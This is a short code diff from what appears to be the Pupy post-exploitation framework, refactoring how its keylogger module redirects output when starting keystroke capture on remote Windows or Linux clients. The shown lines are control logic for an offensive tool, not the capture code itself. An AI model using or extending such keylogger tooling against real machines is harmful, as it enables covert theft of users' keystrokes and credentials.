@@ -38,14 +38,14 @@ class KeyloggerModule(PupyModule):
     def run(self, args):
         if args.action=="start":
             if self.client.is_windows():
-                with redirected_stdio(self.client.conn): #to see the output exception in case of error
+                with redirected_stdio(self): #to see the output exception in case of error
                     if not self.client.conn.modules["pupwinutils.keylogger"].keylogger_start():
                         self.error("the keylogger is already started")
                     else:
                         self.success("keylogger started !")
-            
+
             elif self.client.is_linux():
-                with redirected_stdio(self.client.conn): #to see the output exception in case of error
+                with redirected_stdio(self): #to see the output exception in case of error
                     r = self.client.conn.modules["keylogger"].keylogger_start()
                     if r == 'no_x11':
                         self.error("the keylogger does not work without x11 graphical interface")
